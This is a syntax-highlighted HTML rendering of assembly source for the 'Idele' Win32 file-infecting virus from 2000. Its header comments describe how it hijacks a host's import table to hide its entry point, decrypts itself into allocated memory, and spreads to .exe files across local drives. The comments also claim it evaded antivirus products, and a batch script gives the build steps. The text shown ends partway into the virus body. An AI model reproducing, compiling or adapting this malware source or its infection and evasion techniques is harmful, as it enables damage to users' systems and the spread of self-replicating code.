<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>idele.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc1">; comment $</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Idele virus version 1.9</span><span class="sc0">
</span><span class="sc1">;  by Doxtor L. /[T.I], July-December 2000</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  test version!! (infect goat*.exe files)</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  Disclaimer:</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  This program is a virus.</span><span class="sc0">
</span><span class="sc1">;  It's not designed to be a destructive one, but anyway it's a virus !</span><span class="sc0">
</span><span class="sc1">;  This virus is my third one, designed for Ms-Windows. </span><span class="sc0">
</span><span class="sc1">;  All tests were performed on Win95/Winnt platforms.</span><span class="sc0">
</span><span class="sc1">;  But i'm quite sure it runs fine on win98 too.</span><span class="sc0">
</span><span class="sc1">;  It don't work fine on Win2k.</span><span class="sc0">
</span><span class="sc1">;  It was written for educational purposes!</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Greets:</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;      -Androgyne  : i hope to see soon a win32 virus of your own </span><span class="sc0">
</span><span class="sc1">;                    my "dear student" :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      -Bumblebee  : Thanks for the informations     </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;      -Cryptic    : Thanks for beta-testing</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      -Del armg0  : are you a reader of "Pif le chien"? :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      -Dyrdyr     : you're a maths genius, man :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      -Mandragore : A day without alcohol/weed is a bad day?</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      -Spanska    : fat 25yrs old girls are not necessary ugly ;)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      -T00fic     : Do you like my poetry? :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      -Darkman    : Tania fan number one :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      -Giga       : i'm too fat to be able to ride a pony :)</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;      -LordJulus  : i can't wait for your next tutorials :)</span><span class="sc0">
</span><span class="sc1">;     </span><span class="sc0">
</span><span class="sc1">;      -M          : heya "marchand de sabl‚s"!</span><span class="sc0">
</span><span class="sc1">;      </span><span class="sc0">
</span><span class="sc1">;      -Tally      : a new virus for your collection!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      -T2         : Is there a life be4 the death?</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       Vecna      : when is the next full moon? :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc1">;       ...And all the vxers from undernet irc servers</span><span class="sc0">
</span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc1">;       FREE VIRUSES !</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       Virus is knowledge!</span><span class="sc0">
</span><span class="sc1">;       So trading viruses with ratios</span><span class="sc0">
</span><span class="sc1">;       is an opposition to the free spreading of knowledge!</span><span class="sc0">
</span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc1">;          </span><span class="sc0">
</span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Description:</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  This virus uses several viral technics.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Checksum/Crc32 routines to recognize API string in export section </span><span class="sc0">
</span><span class="sc1">;  of Kernel32.dll</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  The  main feature is that the sections flags of host aren't modified</span><span class="sc0">
</span><span class="sc1">;  (except for import table) i.e, if a section is a non-writable one, after </span><span class="sc0">
</span><span class="sc1">;  infection the section flag is still non-writable.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  How we do that?</span><span class="sc0">
</span><span class="sc1">;  The virus uses the GlobalAlloc API.</span><span class="sc0">
</span><span class="sc1">;  This api is called first, to create a memory space to decrypt and run the </span><span class="sc0">
</span><span class="sc1">;  main part of virus there. But we need a special routine to force targets</span><span class="sc0">
</span><span class="sc1">;  to use this api.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  To do that, we search in Import table of the target, an API string name</span><span class="sc0">
</span><span class="sc1">;  with 11 or more, letters.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  We patch the name with "GlobalAlloc" string.</span><span class="sc0">
</span><span class="sc1">;  At run time, the infected host is loaded in memory by Windows, the address</span><span class="sc0">
</span><span class="sc1">;  of GlobalAlloc API is set. Windows makes the job for us :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  So we need to patch the place this address is, with the correct</span><span class="sc0">
</span><span class="sc1">;  one, we use GetProcAddress. (we can't pre-calculate a checksum for it</span><span class="sc0">
</span><span class="sc1">;  because the name of this API isn't known before infection time)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  The virus uses the allocated memory space to move to/decrypt its main routine.</span><span class="sc0">
</span><span class="sc1">;  So when the decryption is completed, the virus jumps to that new memory space.</span><span class="sc0">
</span><span class="sc1">;  It creates an infectious thread and returns to host.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;  The virus uses a *new* EPO technic. The virus don't patch the target code!</span><span class="sc0">
</span><span class="sc1">;  and the virus don't change the entry point of target PE exe.</span><span class="sc0">
</span><span class="sc1">;  As far i know , this is the first virus to use the following technic.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  A Windows application contains in its memory space an array that will be</span><span class="sc0">
</span><span class="sc1">;  fullfilled with APIs addresses by the operating sytem.</span><span class="sc0">
</span><span class="sc1">;  The virus at infection time, changes in target the address of the import</span><span class="sc0">
</span><span class="sc1">;  table and create a small new one. The old table is fullfilled with </span><span class="sc0">
</span><span class="sc1">;  the virus address. So when the infected host calls an API, the virus</span><span class="sc0">
</span><span class="sc1">;  will be called first. The first thing, the virus does, is to rebuild   </span><span class="sc0">
</span><span class="sc1">;  the import table of the host at the right place!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;  before infection: </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Import table                      Code section</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  API1:        &lt;------------------- "call [API1]"                  </span><span class="sc0">
</span><span class="sc1">;  XXXX                                                         </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  API2:</span><span class="sc0">
</span><span class="sc1">;  YYYY         &lt;------------------- "Call [API2]"</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  (...)                              (...)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; After infection:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Old import table    Code section                New import table </span><span class="sc0">
</span><span class="sc1">;                                                 </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; API1:                                              API1: </span><span class="sc0">
</span><span class="sc1">; &lt;virus address&gt;    &lt;-----------"call [API1]"       XXXX </span><span class="sc0">
</span><span class="sc1">;                                                   </span><span class="sc0">
</span><span class="sc1">; API2:                                              (...)</span><span class="sc0">
</span><span class="sc1">; &lt;virus address&gt;:  &lt;------------"call [API2]"    </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; (...)                            (...)             API(N):(N is often &lt;=4) </span><span class="sc0">
</span><span class="sc1">;                                                    &lt;GlobalAlloc address&gt;</span><span class="sc0">
</span><span class="sc1">;                                                  </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Most people in vx-scene thinks applications in high level language</span><span class="sc0">
</span><span class="sc1">; call APIs using only two ways:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 1)                           2)</span><span class="sc0">
</span><span class="sc1">;     call API:                   call [&lt;address in Import table&gt;] </span><span class="sc0">
</span><span class="sc1">;     (...)</span><span class="sc0">
</span><span class="sc1">;     API:</span><span class="sc0">
</span><span class="sc1">;     jmp [&lt;address in Import table&gt;]</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; They are wrong!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; In notepad.exe of Win95, i have found code like that:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;     mov edi,dword ptr [&lt;Address in Import table&gt;]</span><span class="sc0">
</span><span class="sc1">;     call edi</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; And believe me, most of applications (Netscape 4.5 ...)</span><span class="sc0">
</span><span class="sc1">; can use that way to call an API.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; An infected program could be unstable due to the way it performs</span><span class="sc0">
</span><span class="sc1">; an API call! </span><span class="sc0">
</span><span class="sc1">; Happily the applications rarely call an API from Kernel32, </span><span class="sc0">
</span><span class="sc1">; using an "unusal" way, at the very beginning of their code !</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The W(rite) attribute is set in the section the Import table is to be</span><span class="sc0">
</span><span class="sc1">; Win NT4 compatible.</span><span class="sc0">
</span><span class="sc1">; Patch the Import table at run time seems impossible under Win2k!</span><span class="sc0">
</span><span class="sc1">; Even the use of WriteProcessMemory API don't help to solve that problem:(</span><span class="sc0">
</span><span class="sc1">; Happily there is a solution to bypass that...but it's another story :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  The infectious routine is a classic one:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   -Search x target(s) on whole C:,D:,E:,F: drives and infects it/them.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   -The thread begins with a pause, virus stop during x seconds before to infect.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   -The virus is composed of 2 parts: </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    a loading routine to create memory space and decrypt the virus there </span><span class="sc0">
</span><span class="sc1">;    (this routine is located in executable section of host)</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;    and the main part of virus located in last section.</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  This virus isn't detected by major anti-viruses at the time it was written.</span><span class="sc0">
</span><span class="sc1">;  So once again, BE CAREFUL!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  To compile, use the following file:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Syntax is:   compile virus (and not "compile virus.asm")</span><span class="sc0">
</span><span class="sc1">;  [assuming the virus source code is named: virus.asm]</span><span class="sc0">
</span><span class="sc1">;  The assembler used is tasm 5.0 (c)Borland</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ///// begin of compile.bat /////</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; tasm32 /m /ml %1.asm</span><span class="sc0">
</span><span class="sc1">; tlink32 /Tpe /aa /c %1,%1.exe,,import32.lib</span><span class="sc0">
</span><span class="sc1">; rem pewrite.exe set the write attribute in all sections headers</span><span class="sc0">
</span><span class="sc1">; pewrite %1.exe</span><span class="sc0">
</span><span class="sc1">; del %1.obj</span><span class="sc0">
</span><span class="sc1">; del %1.map</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ///// End of compile.bat /////</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; To test the virus change the string "*.exe",0 into "test*.exe",0</span><span class="sc0">
</span><span class="sc1">; Remember the virus size need to be a 4 multiple!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; $</span><span class="sc0">

</span><span class="sc9">%out</span><span class="sc0"> </span><span class="sc5">WARNING</span><span class="sc0">!
</span><span class="sc9">%out</span><span class="sc0"> </span><span class="sc5">YOU</span><span class="sc0"> </span><span class="sc5">HAVE</span><span class="sc0"> </span><span class="sc5">JUST</span><span class="sc0"> </span><span class="sc5">COMPILED</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0"> </span><span class="sc5">FULL</span><span class="sc0"> </span><span class="sc5">FUNCTIONNAL</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0">!
</span><span class="sc9">%out</span><span class="sc0"> </span><span class="sc5">ERASE</span><span class="sc0"> </span><span class="sc5">IT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">YOU</span><span class="sc0"> </span><span class="sc5">DON</span><span class="sc12">'T KNOW WHAT YOU'</span><span class="sc5">RE</span><span class="sc0"> </span><span class="sc5">DOING</span><span class="sc0">!





</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">                 </span><span class="sc1">;only for the 1st generation</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">


</span><span class="sc9">.data</span><span class="sc0"> 


</span><span class="sc5">T</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Warning!"</span><span class="sc0">              </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Message</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Ready to be infected"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"by Idele  "</span><span class="sc0">            </span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"virus v 1.9 /[T.I] ?"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Message2</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Exit infection?"</span><span class="sc0">       </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Krl32</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"KERNEL32.DLL"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">EP0</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EP</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ExitProcess"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">HereisAddy4Message2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">Fake_OFT</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EP0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Fake_FT</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Addy4EP</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc9">.code</span><span class="sc0">                                   </span><span class="sc1">;code executable starts here</span><span class="sc0">

</span><span class="sc5">HOST</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LoaderLength</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EndVir</span><span class="sc4">-</span><span class="sc5">BeginVir</span><span class="sc0">                 </span><span class="sc1">;the real size is a multiple of 4</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">                                </span><span class="sc1">;warning message</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">T</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Message</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">


</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Krl32</span><span class="sc0">                       </span><span class="sc1">;retrieve Kernel32.dll address</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EP</span><span class="sc0">                          </span><span class="sc1">;retrieve ExitProcess address </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Addy4EP</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">Import</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Addy4EP</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VA_API</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EP</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VA_OFT</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fake_OFT</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VA_FT</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fake_FT</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ApiHack</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EP</span><span class="sc0">




</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">HereisAddy4Message2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Msg2</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FillUpJump</span><span class="sc0">


</span><span class="sc5">Msg2</span><span class="sc4">:</span><span class="sc0">



</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5000</span><span class="sc0">                               </span><span class="sc1">;time needed to infect </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">



</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">                                </span><span class="sc1">;exit message </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">T</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Message2</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                 </span><span class="sc1">;exit first generation virus </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">







</span><span class="sc1">;[real start of virus]:</span><span class="sc0">

</span><span class="sc5">BeginVir</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">                             

 </span><span class="sc5">Delta</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;compute delta offset</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">



  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;search in stack return</span><span class="sc0">
                                               </span><span class="sc1">;address</span><span class="sc0">
                                               
 
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;read first byte of "call"</span><span class="sc0">
                                               </span><span class="sc1">;opcode</span><span class="sc0">

  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">                                   </span><span class="sc1">;is 15?</span><span class="sc0">
  </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Jump_Far</span><span class="sc0">                                 </span><span class="sc1">;no...it's a call yyyy</span><span class="sc0">
                                               
   
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;...yes it's  call [xxxxx]</span><span class="sc0">
                                               </span><span class="sc1">;read xxxx, xxxx is a pointer</span><span class="sc0">
                                               </span><span class="sc1">;to API address</span><span class="sc0">
                           
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FillUpJump</span><span class="sc0">                               

  </span><span class="sc5">Jump_Far</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;it's a  call yyyy</span><span class="sc0">
          
  
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;what is the destination of</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                      </span><span class="sc1">;"call yyyy"?</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                                               </span><span class="sc1">;</span><span class="sc0">
 
  </span><span class="sc5">FillUpJump</span><span class="sc4">:</span><span class="sc0">                                 

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">JumpAway</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">



</span><span class="sc5">ComputeKernelAddress</span><span class="sc4">:</span><span class="sc0">



         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">       </span><span class="sc1">;mov edx,dword [Import]</span><span class="sc0">
